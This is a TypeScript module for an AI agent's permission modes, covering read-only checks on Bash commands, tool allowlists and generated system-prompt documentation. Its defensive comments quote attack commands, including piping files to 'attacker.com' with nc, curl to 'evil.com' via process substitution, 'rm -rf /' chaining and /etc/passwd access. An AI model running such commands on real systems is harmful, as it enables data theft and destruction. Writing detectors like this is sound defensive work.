/**
 * Centralized Permission Mode Manager
 *
 * Manages agent permission modes for tool execution.
 * Each session has its own mode state - no global state contamination.
 *
 * Available Permission Modes:
 * - 'safe': Read-only exploration mode (blocks writes, never prompts)
 * - 'ask': Ask for permission on dangerous operations (default interactive behavior)
 * - 'allow-all': Skip all permission checks (everything allowed)
 */

import { homedir } from 'os';
import { parse as parseShellCommand, type ParseEntry } from 'shell-quote';
import { debug } from '../utils/debug.ts';
import type { PermissionsContext, MergedPermissionsConfig } from './permissions-config.ts';
import {
  type PermissionMode,
  type ModeConfig,
  type CompiledApiEndpointRule,
  PERMISSION_MODE_ORDER,
  PERMISSION_MODE_CONFIG,
  SAFE_MODE_CONFIG,
} from './mode-types.ts';

// Re-export types and config from mode-types (single source of truth)
export {
  type PermissionMode,
  type ModeConfig,
  type CompiledApiEndpointRule,
  PERMISSION_MODE_ORDER,
  PERMISSION_MODE_CONFIG,
  SAFE_MODE_CONFIG,
};

/**
 * State for a single session's permission mode
 */
export interface ModeState {
  /** Session ID */
  sessionId: string;
  /** Current permission mode */
  permissionMode: PermissionMode;
  /** Callback when mode state changes */
  onStateChange?: (state: ModeState) => void;
}

/**
 * Callbacks for mode changes
 */
export interface ModeCallbacks {
  onStateChange?: (state: ModeState) => void;
}

// ============================================================
// Path Matching Utilities
// ============================================================

/**
 * Expand ~ to home directory
 */
function expandHome(path: string): string {
  if (path.startsWith('~/') || path === '~') {
    return path.replace(/^~/, homedir());
  }
  return path;
}

/**
 * Convert a simple glob pattern to a regex
 * Supports: ** (recursive), * (single segment), ? (single char)
 */
function globToRegex(pattern: string): RegExp {
  // Expand ~ in pattern
  const expandedPattern = expandHome(pattern);

  // Escape special regex chars except glob wildcards
  let regex = expandedPattern
    .replace(/[.+^${}()|[\]\\]/g, '\\$&')  // Escape regex special chars
    .replace(/\*\*/g, '\0DOUBLE_STAR\0')   // Temporarily replace **
    .replace(/\*/g, '[^/]*')                // * matches single path segment
    .replace(/\0DOUBLE_STAR\0/g, '.*')      // ** matches anything including /
    .replace(/\?/g, '.');                   // ? matches single char

  return new RegExp(`^${regex}$`);
}

/**
 * Check if a path matches any of the allowed write path patterns
 */
function matchesAllowedWritePath(filePath: string, allowedPaths: string[]): boolean {
  // Normalize path (expand ~ and use forward slashes)
  const normalizedPath = expandHome(filePath).replace(/\\/g, '/');

  for (const pattern of allowedPaths) {
    try {
      const regex = globToRegex(pattern);
      if (regex.test(normalizedPath)) {
        debug(`[Mode] Path "${normalizedPath}" matches allowed pattern "${pattern}"`);
        return true;
      }
    } catch (e) {
      debug(`[Mode] Invalid glob pattern "${pattern}":`, e);
    }
  }
  return false;
}

// ============================================================
// Mode Manager Class
// ============================================================

/**
 * Manager for per-session permission mode state.
 * Each session has its own state - NO GLOBAL STATE.
 */
class ModeManager {
  private states: Map<string, ModeState> = new Map();
  private callbacks: Map<string, ModeCallbacks> = new Map();
  private subscribers: Map<string, Set<() => void>> = new Map();

  /**
   * Get or create state for a session
   */
  getState(sessionId: string): ModeState {
    let state = this.states.get(sessionId);
    if (!state) {
      state = {
        sessionId,
        permissionMode: 'ask', // Default to 'ask' until initialized
      };
      this.states.set(sessionId, state);
    }
    return state;
  }

  /**
   * Set permission mode for a session
   */
  setPermissionMode(sessionId: string, mode: PermissionMode): void {
    const existing = this.getState(sessionId);
    const newState = { ...existing, permissionMode: mode };
    this.states.set(sessionId, newState);

    debug(`[Mode] Set permission mode to ${mode} for session ${sessionId}`);

    // Notify callbacks (for CraftAgent internal sync)
    const callbacks = this.callbacks.get(sessionId);
    if (callbacks?.onStateChange) {
      callbacks.onStateChange(newState);
    }

    // Notify React subscribers (for useSyncExternalStore)
    this.subscribers.get(sessionId)?.forEach(cb => cb());
  }

  /**
   * Register callbacks for a session
   */
  registerCallbacks(sessionId: string, callbacks: ModeCallbacks): void {
    this.callbacks.set(sessionId, callbacks);
  }

  /**
   * Unregister callbacks for a session
   */
  unregisterCallbacks(sessionId: string): void {
    this.callbacks.delete(sessionId);
  }

  /**
   * Clean up a session's state
   */
  cleanupSession(sessionId: string): void {
    this.states.delete(sessionId);
    this.callbacks.delete(sessionId);
    this.subscribers.delete(sessionId);
  }

  /**
   * Subscribe to mode changes for a session (for React useSyncExternalStore)
   * Returns an unsubscribe function
   */
  subscribe(sessionId: string, callback: () => void): () => void {
    if (!this.subscribers.has(sessionId)) {
      this.subscribers.set(sessionId, new Set());
    }
    this.subscribers.get(sessionId)!.add(callback);

    // Return unsubscribe function
    return () => {
      this.subscribers.get(sessionId)?.delete(callback);
    };
  }
}

// Singleton manager instance
export const modeManager = new ModeManager();

// ============================================================
// Permission Mode API
// ============================================================

/**
 * Get the current permission mode for a session
 */
export function getPermissionMode(sessionId: string): PermissionMode {
  return modeManager.getState(sessionId).permissionMode;
}

/**
 * Set the permission mode for a session
 */
export function setPermissionMode(sessionId: string, mode: PermissionMode): void {
  modeManager.setPermissionMode(sessionId, mode);
}

/**
 * Cycle to the next permission mode (for SHIFT+TAB)
 * @param sessionId - The session to cycle mode for
 * @param enabledModes - Optional list of enabled modes to cycle through (defaults to all 3)
 * Returns the new mode
 */
export function cyclePermissionMode(
  sessionId: string,
  enabledModes?: PermissionMode[]
): PermissionMode {
  const currentMode = getPermissionMode(sessionId);
  // Use provided modes or default to all modes
  const modes = enabledModes && enabledModes.length >= 2 ? enabledModes : PERMISSION_MODE_ORDER;
  const currentIndex = modes.indexOf(currentMode);

  // If current mode not in enabled list, jump to first enabled mode
  if (currentIndex === -1) {
    const nextMode = modes[0] ?? 'ask';
    setPermissionMode(sessionId, nextMode);
    return nextMode;
  }

  const nextIndex = (currentIndex + 1) % modes.length;
  // Safe assertion: nextIndex is always valid due to modulo operation
  const nextMode = modes[nextIndex] as PermissionMode;
  setPermissionMode(sessionId, nextMode);
  return nextMode;
}

/**
 * Subscribe to mode changes for a session (for React useSyncExternalStore)
 * Returns an unsubscribe function
 */
export function subscribeModeChanges(sessionId: string, callback: () => void): () => void {
  return modeManager.subscribe(sessionId, callback);
}

/**
 * Get mode state for a session
 */
export function getModeState(sessionId: string): ModeState {
  return modeManager.getState(sessionId);
}

/**
 * Initialize permission mode state for a session with callbacks
 */
export function initializeModeState(
  sessionId: string,
  initialMode: PermissionMode | { permissionMode?: PermissionMode },
  callbacks?: ModeCallbacks
): void {
  let mode: PermissionMode;

  if (typeof initialMode === 'string') {
    mode = initialMode;
  } else if ('permissionMode' in initialMode && initialMode.permissionMode) {
    mode = initialMode.permissionMode;
  } else {
    // Default to 'ask' if not specified
    mode = 'ask';
  }

  // IMPORTANT: Register callbacks BEFORE setting mode so the initial
  // state change triggers the callback.
  if (callbacks) {
    modeManager.registerCallbacks(sessionId, callbacks);
  }
  modeManager.setPermissionMode(sessionId, mode);
}

/**
 * Clean up mode state for a session
 */
export function cleanupModeState(sessionId: string): void {
  modeManager.cleanupSession(sessionId);
}

// ============================================================
// Tool Blocking Logic (Centralized)
// ============================================================

/**
 * Config type that works with both ModeConfig and MergedPermissionsConfig
 */
type ToolCheckConfig = ModeConfig | MergedPermissionsConfig;

// ============================================================
// Command Chaining Detection (Security)
// ============================================================

/**
 * Operators that chain multiple commands together.
 * These are dangerous because they allow executing arbitrary commands
 * after a "safe" prefix like: `ls && rm -rf /`
 */
export const DANGEROUS_CHAIN_OPERATORS = new Set([
  '&&',   // AND - second command runs if first succeeds
  '||',   // OR - second command runs if first fails
  ';',    // Sequence - always runs second command
  '|',    // Pipe - connects stdout to stdin (can chain to dangerous commands)
  '&',    // Background - runs command in background
  '|&',   // Pipe stderr - bash extension
]);

/**
 * Operators that write to files.
 * These are dangerous because they can overwrite/modify files.
 */
export const DANGEROUS_REDIRECT_OPERATORS = new Set([
  '>',    // Overwrite file
  '>>',   // Append to file
  '>&',   // Redirect stderr to file
]);

/**
 * Extract the operator string from a shell-quote operator token.
 * shell-quote returns operators as objects with an `op` property.
 * Returns undefined if not an operator.
 */
function getOperator(token: ParseEntry): string | undefined {
  if (typeof token === 'object' && token !== null && 'op' in token) {
    return token.op;
  }
  return undefined;
}

/**
 * Check if a command contains dangerous shell operators (command chaining or redirects).
 *
 * This prevents attacks like:
 * - `ls && rm -rf /` (command chaining)
 * - `cat file | nc attacker.com 1234` (piping to network)
 * - `echo "data" > /etc/passwd` (file overwrite)
 *
 * Uses shell-quote to properly parse the command, handling edge cases like:
 * - Quoted strings: `ls "&&"` is safe (the && is a literal string)
 * - Escaped chars: `ls \&\&` is safe (escaped)
 *
 * @param command - The bash command to check
 * @returns true if command contains dangerous operators, false if safe
 */
export function hasDangerousShellOperators(command: string): boolean {
  try {
    const parsed = parseShellCommand(command);

    for (const token of parsed) {
      const op = getOperator(token);
      if (op) {
        if (DANGEROUS_CHAIN_OPERATORS.has(op)) {
          debug(`[Mode] Dangerous chain operator detected: "${op}" in command: ${command}`);
          return true;
        }
        if (DANGEROUS_REDIRECT_OPERATORS.has(op)) {
          debug(`[Mode] Dangerous redirect operator detected: "${op}" in command: ${command}`);
          return true;
        }
      }
    }

    return false;
  } catch (error) {
    // Parse error - assume dangerous (fail closed)
    debug(`[Mode] Shell parse error for command "${command}":`, error);
    return true;
  }
}

/**
 * Control characters that act as command separators or could be used for injection.
 * These are dangerous because they can terminate the "safe" command and start a new one.
 */
const DANGEROUS_CONTROL_CHARS = new Set([
  '\n',    // Newline - acts as command separator in bash
  '\r',    // Carriage return - can act as newline
  '\x00',  // Null byte - can truncate strings in some contexts
]);

/**
 * Check if a command contains dangerous control characters.
 *
 * Newlines and carriage returns act as command separators in bash:
 * - `ls\nrm -rf /` executes both ls and rm
 *
 * @param command - The bash command to check
 * @returns true if command contains dangerous control chars, false if safe
 */
export function hasDangerousControlChars(command: string): boolean {
  for (const char of command) {
    if (DANGEROUS_CONTROL_CHARS.has(char)) {
      debug(`[Mode] Dangerous control character detected (code ${char.charCodeAt(0)}) in command`);
      return true;
    }
  }
  return false;
}

/**
 * Check if a command contains dangerous command/process substitution patterns.
 *
 * Detects:
 * - Command substitution: $(...) or `...` (backticks)
 * - Process substitution: <(...) or >(...)
 *
 * These are dangerous because they execute arbitrary commands:
 * - `ls $(rm -rf /)` - the rm runs during argument expansion
 * - `echo "$(cat /etc/passwd)"` - executes even inside double quotes
 * - `cat <(curl http://evil.com)` - process substitution runs curl
 *
 * Note: Single-quoted strings are safe: `echo '$(rm)'` is literal text
 *
 * @param command - The bash command to check
 * @returns true if command contains dangerous substitution, false if safe
 */
export function hasDangerousSubstitution(command: string): boolean {
  let inSingleQuote = false;
  let escaped = false;

  for (let i = 0; i < command.length; i++) {
    const char = command[i];
    const nextChar = command[i + 1];

    // Handle escape sequences (only outside single quotes)
    if (escaped) {
      escaped = false;
      continue;
    }

    if (char === '\\' && !inSingleQuote) {
      escaped = true;
      continue;
    }

    // Track single quote state (double quotes don't protect against substitution)
    if (char === "'" && !escaped) {
      inSingleQuote = !inSingleQuote;
      continue;
    }

    // Only check for dangerous patterns outside single quotes
    if (!inSingleQuote) {
      // Command substitution: $(
      if (char === '$' && nextChar === '(') {
        debug(`[Mode] Command substitution $() detected in: ${command}`);
        return true;
      }

      // Backtick command substitution
      if (char === '`') {
        debug(`[Mode] Backtick substitution detected in: ${command}`);
        return true;
      }

      // Process substitution: <( or >(
      if ((char === '<' || char === '>') && nextChar === '(') {
        debug(`[Mode] Process substitution detected in: ${command}`);
        return true;
      }
    }
  }

  return false;
}

/**
 * Check if a Bash command is read-only using the given config.
 *
 * A command is considered safe if:
 * 1. It does NOT contain dangerous control characters (newlines, etc.)
 * 2. It matches one of the read-only patterns (e.g., starts with `ls`, `cat`, `git status`)
 * 3. It does NOT contain dangerous shell operators (&&, ||, ;, |, >, >>)
 * 4. It does NOT contain command/process substitution ($(), ``, <(), >())
 *
 * This multi-step check prevents attacks like:
 * - `ls\nrm -rf /` (newline injection)
 * - `ls && rm -rf /` (command chaining)
 * - `ls $(rm -rf /)` (command substitution)
 * - `cat <(curl http://evil.com)` (process substitution)
 */
function isReadOnlyBashCommandWithConfig(command: string, config: ToolCheckConfig): boolean {
  const trimmedCommand = command.trim();

  // Step 1: Reject commands with dangerous control characters (newlines act as command separators)
  if (hasDangerousControlChars(trimmedCommand)) {
    debug(`[Mode] Command contains dangerous control characters`);
    return false;
  }

  // Step 2: Check if command matches a safe prefix pattern
  const matchesSafePattern = config.readOnlyBashPatterns.some(pattern => pattern.test(trimmedCommand));
  if (!matchesSafePattern) {
    return false;
  }

  // Step 3: Verify no dangerous operators (prevents chaining attacks)
  if (hasDangerousShellOperators(trimmedCommand)) {
    debug(`[Mode] Command "${trimmedCommand}" matches safe pattern but contains dangerous operators`);
    return false;
  }

  // Step 4: Verify no command/process substitution (prevents embedded command execution)
  if (hasDangerousSubstitution(trimmedCommand)) {
    debug(`[Mode] Command "${trimmedCommand}" matches safe pattern but contains dangerous substitution`);
    return false;
  }

  return true;
}

/**
 * Check if a Bash command is read-only using the default safe mode config.
 * Exported for testing.
 *
 * @param command - The bash command to check
 * @returns true if command is safe to run in read-only mode
 */
export function isReadOnlyBashCommand(command: string): boolean {
  return isReadOnlyBashCommandWithConfig(command, SAFE_MODE_CONFIG);
}

/**
 * Check if an MCP tool is read-only using the given config
 */
function isReadOnlyMcpToolWithConfig(toolName: string, config: ToolCheckConfig): boolean {
  return config.readOnlyMcpPatterns.some(pattern => pattern.test(toolName));
}

/**
 * Check if an API call is allowed using the given config
 * Checks fine-grained endpoint rules (method + path pattern)
 */
function isApiCallAllowedWithConfig(method: string, path: string | undefined, config: ToolCheckConfig): boolean {
  const upperMethod = method.toUpperCase();

  // GET is always allowed
  if (upperMethod === 'GET') return true;

  // Check fine-grained endpoint rules (if path is available)
  if (path && config.allowedApiEndpoints) {
    for (const rule of config.allowedApiEndpoints) {
      if (rule.method === upperMethod && rule.pathPattern.test(path)) {
        return true;
      }
    }
  }

  return false;
}

/**
 * Check if an API endpoint is allowed based on permissions context.
 * Used in 'ask' mode to auto-allow whitelisted API endpoints from permissions.json.
 *
 * @param method - HTTP method (GET, POST, etc.)
 * @param path - API endpoint path
 * @param permissionsContext - Context for loading custom permissions
 * @returns true if endpoint is allowed (GET or matches allowedApiEndpoints rules)
 */
export function isApiEndpointAllowed(
  method: string,
  path: string | undefined,
  permissionsContext?: PermissionsContext
): boolean {
  let config: ToolCheckConfig;

  if (permissionsContext) {
    // Lazy import to avoid circular dependency
    const { permissionsConfigCache } = require('./permissions-config.ts');
    config = permissionsConfigCache.getMergedConfig(permissionsContext);
  } else {
    config = SAFE_MODE_CONFIG;
  }

  return isApiCallAllowedWithConfig(method, path, config);
}

/**
 * Tools that are always allowed in any mode (read-only by nature)
 */
const ALWAYS_ALLOWED_TOOLS = new Set([
  'Read', 'Glob', 'Grep',           // File reading
  'Task', 'TaskOutput',             // Agent orchestration
  'WebFetch', 'WebSearch',          // Web research
  'TodoWrite',                       // Task tracking
  'SubmitPlan',                     // Plan submission
  'LSP',                            // Language server (read-only)
]);

/**
 * Result type for tool permission checks
 */
export type ToolCheckResult =
  | { allowed: true; requiresPermission?: false }
  | { allowed: true; requiresPermission: true; description: string }
  | { allowed: false; reason: string };

/**
 * Centralized check: should a tool be allowed based on permission mode?
 *
 * This is the single source of truth for tool permissions.
 * Returns different results based on the permission mode:
 * - 'safe': Block writes entirely (no prompting)
 * - 'ask': Allow but may require permission for dangerous operations
 * - 'allow-all': Allow everything
 */
export function shouldAllowToolInMode(
  toolName: string,
  toolInput: unknown,
  mode: PermissionMode,
  options?: {
    plansFolderPath?: string;
    permissionsContext?: PermissionsContext;
  }
): ToolCheckResult {
  // Get config: merged custom if context provided, otherwise defaults
  let config: ToolCheckConfig;

  if (options?.permissionsContext) {
    // Lazy import to avoid circular dependency
    const { permissionsConfigCache } = require('./permissions-config.ts');
    config = permissionsConfigCache.getMergedConfig(options.permissionsContext);
  } else {
    config = SAFE_MODE_CONFIG;
  }

  // In 'allow-all' mode, only check explicitly blocked tools from permissions.json
  // (not safe mode defaults like Write, Edit, etc.)
  if (mode === 'allow-all') {
    if (config.customBlockedTools?.has(toolName)) {
      return {
        allowed: false,
        reason: `Tool "${toolName}" is explicitly blocked in permissions.json`
      };
    }
    return { allowed: true };
  }

  // In 'ask' mode, only check explicitly blocked tools from permissions.json
  // (not safe mode defaults like Write, Edit, etc.)
  if (mode === 'ask') {
    if (config.customBlockedTools?.has(toolName)) {
      return {
        allowed: false,
        reason: `Tool "${toolName}" is explicitly blocked in permissions.json`
      };
    }
    return { allowed: true };
  }

  // Safe mode: check against read-only allowlist

  // Always-allowed tools (read-only by nature)
  if (ALWAYS_ALLOWED_TOOLS.has(toolName)) {
    return { allowed: true };
  }

  // Check if tool name ends with an always-allowed tool (for MCP variants like mcp__plan__SubmitPlan)
  for (const allowedTool of ALWAYS_ALLOWED_TOOLS) {
    if (toolName.endsWith(`__${allowedTool}`)) {
      return { allowed: true };
    }
  }

  // Handle Bash - check if command is read-only
  if (toolName === 'Bash') {
    const input = toolInput as Record<string, unknown> | null;
    const command = input?.command;
    if (typeof command === 'string' && isReadOnlyBashCommandWithConfig(command, config)) {
      return { allowed: true };
    }
    return {
      allowed: false,
      reason: `This Bash command is not in the read-only allowlist for ${config.displayName}. Switch to Ask or Allow All mode (${config.shortcutHint}) to run it.`
    };
  }

  // Handle Write/Edit/MultiEdit/NotebookEdit - allow if targeting plans folder or allowedWritePaths
  if (toolName === 'Write' || toolName === 'Edit' || toolName === 'MultiEdit' || toolName === 'NotebookEdit') {
    const input = toolInput as Record<string, unknown> | null;
    const filePath = (input?.file_path ?? input?.notebook_path) as string | undefined;

    if (filePath) {
      // Check plans folder exception
      if (options?.plansFolderPath) {
        const normalizedPath = filePath.replace(/\\/g, '/');
        const normalizedPlansDir = options.plansFolderPath.replace(/\\/g, '/');
        debug(`[Mode] Checking plans folder exception: path="${normalizedPath}", plansDir="${normalizedPlansDir}"`);

        if (normalizedPath.startsWith(normalizedPlansDir)) {
          debug(`[Mode] Allowing ${toolName} to plans folder`);
          return { allowed: true };
        }
      }

      // Check allowedWritePaths from permissions config
      if (config.allowedWritePaths && config.allowedWritePaths.length > 0) {
        if (matchesAllowedWritePath(filePath, config.allowedWritePaths)) {
          debug(`[Mode] Allowing ${toolName} via allowedWritePaths`);
          return { allowed: true };
        }
      }
    }
  }

  // Blocked tools (Write, Edit, MultiEdit, NotebookEdit)
  if (config.blockedTools.has(toolName)) {
    return {
      allowed: false,
      reason: getBlockReasonWithConfig(toolName, config)
    };
  }

  // Handle MCP tools - allow read-only, block write operations
  if (toolName.startsWith('mcp__')) {
    // Always allow preferences tools
    if (toolName.startsWith('mcp__preferences__')) {
      return { allowed: true };
    }

    // Handle session-scoped tools - allow read-only, block mutations
    if (toolName.startsWith('mcp__session__')) {
      // Read-only session tools - always allowed
      const readOnlySessionTools = [
        'mcp__session__SubmitPlan',
        'mcp__session__config_validate',
        'mcp__session__source_test',
      ];
      if (readOnlySessionTools.includes(toolName)) {
        return { allowed: true };
      }

      // Write session tools - blocked in safe mode
      return {
        allowed: false,
        reason: `Session configuration changes are blocked in ${config.displayName}. Switch to Ask or Allow All mode (${config.shortcutHint}) to create, update, or delete sources and agents.`
      };
    }

    // Handle API tools exposed via MCP (mcp__<source>__api_<name>)
    // These need endpoint-level permission checks, not just MCP read-only patterns
    if (toolName.includes('__api_')) {
      const input = toolInput as Record<string, unknown> | null;
      const method = (input?.method as string) || 'GET';
      const path = input?.path as string | undefined;
      if (isApiCallAllowedWithConfig(method, path, config)) {
        return { allowed: true };
      }
      return {
        allowed: false,
        reason: `API ${method} ${path ?? ''} is blocked in ${config.displayName}. Switch to Ask or Allow All mode (${config.shortcutHint}) to make changes.`
      };
    }

    if (isReadOnlyMcpToolWithConfig(toolName, config)) {
      return { allowed: true };
    }
    return {
      allowed: false,
      reason: `MCP write operations are blocked in ${config.displayName}. Switch to Ask or Allow All mode (${config.shortcutHint}) to make changes.`
    };
  }

  // Handle API tools - allow GET, block mutations unless endpoint is whitelisted
  if (toolName.startsWith('api_')) {
    const input = toolInput as Record<string, unknown> | null;
    const method = (input?.method as string) || 'GET';
    const path = input?.path as string | undefined;
    if (isApiCallAllowedWithConfig(method, path, config)) {
      return { allowed: true };
    }
    return {
      allowed: false,
      reason: `API ${method} ${path ?? ''} is blocked in ${config.displayName}. Switch to Ask or Allow All mode (${config.shortcutHint}) to make changes.`
    };
  }

  // Default: allow other tools not explicitly handled
  return { allowed: true };
}

/**
 * Get a user-friendly message explaining why a tool is blocked (using config)
 */
function getBlockReasonWithConfig(toolName: string, config: ToolCheckConfig): string {
  const displayName = config.displayName;
  const shortcut = config.shortcutHint;

  if (toolName === 'Bash') {
    return `Bash commands are blocked in ${displayName}. Switch to Ask or Allow All mode (${shortcut}) to run commands.`;
  }
  if (toolName === 'Write' || toolName === 'Edit' || toolName === 'MultiEdit') {
    return `File modifications are blocked in ${displayName}. Switch to Ask or Allow All mode (${shortcut}) to make changes.`;
  }
  if (toolName.startsWith('mcp__')) {
    return `MCP write operations are blocked in ${displayName}. Switch to Ask or Allow All mode (${shortcut}) to make changes.`;
  }
  if (toolName.startsWith('api_')) {
    return `API mutations are blocked in ${displayName}. Switch to Ask or Allow All mode (${shortcut}) to make changes.`;
  }
  return `${toolName} is blocked in ${displayName}. Switch to Ask or Allow All mode (${shortcut}) to use this tool.`;
}

/**
 * Create a hook return value that blocks a tool.
 * Returns the correct SDK format for PreToolUse hook blocking.
 *
 * @param reason - The reason for blocking (from shouldAllowToolInMode)
 */
export function blockWithReason(reason: string) {
  return {
    continue: false,
    decision: 'block' as const,
    reason,
  };
}

// ============================================================
// Session State Context (for user messages)
// ============================================================

/**
 * Get the current session state for prompt injection
 */
export function getSessionState(sessionId: string): { permissionMode: PermissionMode } {
  return {
    permissionMode: getPermissionMode(sessionId),
  };
}

/**
 * Format session state as a lightweight XML block for injection into user messages.
 * When in safe mode, includes the plans folder path so agent knows where to write plans.
 */
export function formatSessionState(
  sessionId: string,
  options?: { plansFolderPath?: string }
): string {
  const mode = getPermissionMode(sessionId);

  let result = `<session_state>\nsessionId: ${sessionId}\npermissionMode: ${mode}`;

  // Include plans folder path when in safe mode so agent knows where to write plans
  if (mode === 'safe' && options?.plansFolderPath) {
    result += `\nplansFolderPath: ${options.plansFolderPath}`;
  }

  result += '\n</session_state>';
  return result;
}

// ============================================================
// System Prompt Documentation
// ============================================================

/**
 * Generate the permission modes documentation section for the system prompt.
 * Uses PERMISSION_MODE_CONFIG for display names to stay in sync with UI.
 */
export function getPermissionModesDocumentation(): string {
  const blockedTools = Array.from(SAFE_MODE_CONFIG.blockedTools).join(', ');

  return `## Permission Modes

Craft Agent has three permission modes that control tool execution. The user can cycle through modes with SHIFT+TAB.

| Mode | Color | Description |
|------|-------|-------------|
| **${PERMISSION_MODE_CONFIG['safe'].displayName}** | Grey | ${PERMISSION_MODE_CONFIG['safe'].description} |
| **${PERMISSION_MODE_CONFIG['ask'].displayName}** | Amber | ${PERMISSION_MODE_CONFIG['ask'].description} |
| **${PERMISSION_MODE_CONFIG['allow-all'].displayName}** | Purple | ${PERMISSION_MODE_CONFIG['allow-all'].description} |

You will know the current mode from the \`<session_state>\` block in your context:
\`\`\`
<session_state>
sessionId: abc123
permissionMode: safe
plansFolderPath: /path/to/plans
</session_state>
\`\`\`

### ${PERMISSION_MODE_CONFIG['safe'].displayName} (permissionMode: safe)

Read-only exploration mode. You can read, search, and explore but cannot make changes.

| Operation | Allowed? | Notes |
|-----------|----------|-------|
| Read MCP sources | ✅ | search, list, get operations |
| File exploration | ✅ | Read, Glob, Grep |
| Web search/fetch | ✅ | WebSearch, WebFetch |
| API GET requests | ✅ | Read-only API calls |
| **Plans folder** | ✅ | Write/Edit allowed to session plans folder |
| **Read-only Bash** | ✅ | See list below |
| File writes/edits | ❌ | ${blockedTools} blocked (except plans folder) |
| MCP mutations | ❌ | create, update, delete operations blocked |
| API mutations | ❌ | POST, PUT, DELETE blocked |

**Read-only Bash commands allowed in Explore mode:**
- **File exploration**: ls, tree, cat, head, tail, file, stat, wc, du, df
- **Search**: find, grep, rg, ag, fd, locate, which
- **Git**: git status, git log, git diff, git show, git branch, git blame, git history, git reflog
- **GitHub CLI**: gh pr view/list, gh issue view/list, gh repo view
- **Package managers**: npm ls/list/outdated, yarn list, pip list, cargo tree
- **System info**: pwd, whoami, env, ps, uname, hostname, date
- **Text processing**: jq, yq, sort, uniq, cut, column
- **Network diagnostics**: ping, dig, nslookup, netstat
- **Version checks**: node --version, python --version, etc.

**When ready to implement:** Don't ask the user to switch modes. Instead, write a plan and use \`SubmitPlan\` - the "Accept Plan" button switches to ${PERMISSION_MODE_CONFIG['allow-all'].displayName} mode automatically.

### ${PERMISSION_MODE_CONFIG['ask'].displayName} (permissionMode: ask)

Default interactive mode. Prompts before edits, but read-only operations run freely.

| Operation | Allowed? | Notes |
|-----------|----------|-------|
| All file operations | ✅ | Write, Edit, Read, etc. |
| All MCP operations | ✅ | search, list, create, update, etc. |
| All API operations | ✅ | GET, POST, PUT, DELETE |
| Read-only Bash | ✅ | ls, git status, grep, etc. (same as ${PERMISSION_MODE_CONFIG['safe'].displayName}) |
| Other Bash commands | ⚠️ | Prompts for approval (can click "Always allow") |
| Dangerous Bash | ⚠️ | rm, sudo, git push - always prompts, no auto-allow |

Read-only Bash commands (the same ones allowed in ${PERMISSION_MODE_CONFIG['safe'].displayName} mode) run without prompting. Other commands prompt for permission with an "Always allow this session" option. Dangerous commands always require explicit approval.

### ${PERMISSION_MODE_CONFIG['allow-all'].displayName} (permissionMode: allow-all)

Full autonomous mode. Everything is allowed without prompts - use when you trust the agent to execute the plan.

| Operation | Allowed? | Notes |
|-----------|----------|-------|
| All operations | ✅ | No restrictions, no prompts |

This mode is ideal after reviewing and accepting a plan, as it allows uninterrupted execution.

## Planning (Universal)

You can create structured plans at any time using the \`SubmitPlan\` tool - this is not restricted to any mode.

### When to Use Plans

Create a plan when:
- The task has multiple complex steps
- You want to get user approval before making changes
- The user asks for a plan first

### Creating a Plan

1. Write your plan to a markdown file using the \`Write\` tool
2. Call \`SubmitPlan\` with the file path
3. Wait for user feedback before proceeding

### Plan Format

\`\`\`markdown
# Plan Title

## Summary
Brief description of what this plan accomplishes.

## Steps
1. **Step description** - Details and approach
2. **Another step** - More details
3. ...
\`\`\`

### ${PERMISSION_MODE_CONFIG['safe'].displayName} → Implementation Workflow

When in ${PERMISSION_MODE_CONFIG['safe'].displayName} mode and ready to implement:
1. Write your plan to a markdown file in the plans folder
2. Call \`SubmitPlan\` with the file path
3. The user can click "Accept Plan" to exit ${PERMISSION_MODE_CONFIG['safe'].displayName} mode and begin implementation
4. Once accepted, proceed with the implementation steps

This is the recommended way to transition from exploration to implementation.

### Customizing Explore Mode Permissions

You can customize Explore mode via \`permissions.json\` files - extend what's allowed (bash patterns, MCP tools, API endpoints) or block specific tools entirely.

| Level | Path | Scope |
|-------|------|-------|
| Workspace | \`{workspaceRoot}/permissions.json\` | All sources in workspace |
| Per-source | \`{workspaceRoot}/sources/{slug}/permissions.json\` | That source only (auto-scoped) |

**Before editing**: Read \`~/.craft-agent/docs/permissions.md\` for the full schema and examples.`;
}
